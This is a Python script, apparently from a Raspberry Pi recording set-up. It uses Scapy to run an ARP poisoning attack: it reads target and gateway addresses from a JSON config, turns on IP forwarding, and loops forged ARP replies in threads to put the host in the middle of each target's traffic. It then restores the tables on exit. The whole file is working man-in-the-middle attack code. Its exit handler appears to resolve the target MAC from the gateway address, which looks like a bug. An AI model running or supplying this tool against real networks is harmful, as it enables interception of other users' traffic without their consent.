from scapy.all import *
import os
import signal
import sys
import threading
import time
from subprocess import Popen, PIPE
import re
import atexit
import json

#Get IP Addresses and other releated data
fname = sys.argv[1] if len(sys.argv) > 1 else "/etc/raspap/recorder/recording.conf"

with open(fname, 'r') as gwfile:
    targets = json.load(gwfile) 

packet_count = 1000
conf.iface = "eth0"
conf.verb = 0

#Given an IP, get the MAC. Broadcast ARP Request for a IP Address. Should recieve
#an ARP reply with MAC Address
def get_mac(ip_address):
    #ARP request is constructed. sr function is used to send/ receive a layer 3 packet
    #Alternative Method using Layer 2: resp, unans =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address))
    #resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    pid = Popen(["arp", "-n", ip_address], stdout=PIPE)

    s = pid.communicate()[0]

    mac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]
    ### didn't work reliably on RPi
    #for s,r in resp: 
        #return r[ARP].hwsrc
    return mac

#Restore the network by reversing the ARP poison attack. Broadcast ARP Reply with
#correct MAC and IP Address information
def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
    print("[*] Disabling IP forwarding")
    #Disable IP Forwarding on a mac
    os.system("sysctl -w net.ipv4.ip_forward=0")

    #kill process on a mac
    os.kill(os.getpid(), signal.SIGTERM)

#Keep sending false ARP replies to put our machine in the middle to intercept packets
#This will use our interface MAC address as the hwsrc for the ARP reply
def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    try:
        while True:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(2)
    finally:
        print("[*] Stopped ARP poison attack. Restoring network")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)

def exit_handler():
    for i in range(len(targets)):
        gateway_mac = get_mac(targets[i][2])
        if gateway_mac is None:
            print("[!] Unable to get gateway MAC address. Exiting..")
            break
        else:
            print("[*] Gateway MAC address:" + gateway_mac)
        print("[*] Target IP address: "+ targets[i][0])
        target_mac = get_mac(targets[i][2])
        print("[*] Stopping network capture..Restoring network")
        restore_network(targets[i][2], gateway_mac, targets[i][0], target_mac)

atexit.register(exit_handler)
        
#Start the script
print("[*] Starting script: arp_poison.py")
print("[*] Enabling IP forwarding")
#Enable IP Forwarding on a mac
os.system("sysctl -w net.ipv4.ip_forward=1")

threads = []
for i in range(len(targets)):
    gateway_mac = get_mac(targets[i][2])
    if gateway_mac is None:
        print("[!] Unable to get gateway MAC address. Exiting..")
        sys.exit(0)
    else:
        print("[*] Gateway MAC address:" + gateway_mac)

    print("[*] Target IP address: "+ targets[i][0])
    target_mac = get_mac(targets[i][0])
    if target_mac is None:
        print("[!] Unable to get target MAC address. Exiting..")
        sys.exit(0)
    else:
        print("[*] Target MAC address: "+ target_mac)
    
    t = threading.Thread(target=arp_poison, args=(targets[i][2], gateway_mac, targets[i][0], target_mac))
    t.setDaemon(True)
    threads.append(t)
    t.start()
    
#ARP poison thread
#poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
#poison_thread.start()

#Do nothing
while True:
    time.sleep(5)

